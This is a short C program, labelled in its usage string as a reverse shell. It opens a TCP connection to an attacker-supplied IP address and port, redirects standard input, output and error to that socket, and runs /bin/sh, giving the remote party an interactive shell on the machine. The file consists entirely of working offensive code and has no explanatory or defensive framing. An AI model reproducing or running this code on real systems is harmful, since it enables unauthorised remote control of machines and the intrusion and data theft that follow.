#include <stdio.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>

# define IP_PROTOCOL 0
# define BUFFER_SIZE 1024
# define USAGE "Usage: ./reverse_shell [IP] [PORT]"

/**
 * Print a message and quit with exit code 1
 * */
void exit_with_error(char* message) {
    printf("%s\n", message);
    exit(1);
}

/**
 * Connects to remote server and returns
 * the connection socket descriptor
 * */
int connect_to_server(char* server_ip, int server_port) {
    struct sockaddr_in server_addr;
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    server_addr.sin_port = htons(server_port);
    server_addr.sin_family = AF_INET;
    
    int conn_fd = socket(AF_INET, SOCK_STREAM, IP_PROTOCOL);
    if (conn_fd == -1) {
        exit_with_error("Error in creating the connection socket");
    }

    if (connect(conn_fd, (const struct sockaddr*) &server_addr, sizeof(server_addr)) == -1) {
        exit_with_error("Error while trying to connect to server");
    }

    return conn_fd;
}

int close_connection(int conn_fd) {
    close(conn_fd);
}

void sigint_handler(int code) {
    printf("%s\n", "**EXITING**");
    exit(0);
}

int exec_comm_handler( int sck ) {
    
    close(0); close(1); close(2);
    
    if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) 
        exit_with_error("error duplicating socket for stdin/stdout/stderr");

    char* shell_argv[] = {"/bin/sh", NULL};
    execv("/bin/sh", shell_argv);
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        exit_with_error(USAGE);
    }
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int conn_fd = connect_to_server(ip, port);

    // Quit on ctrl + C
    signal(SIGINT, sigint_handler);
    
    exec_comm_handler(conn_fd);

    close_connection(conn_fd);
    return 0;
}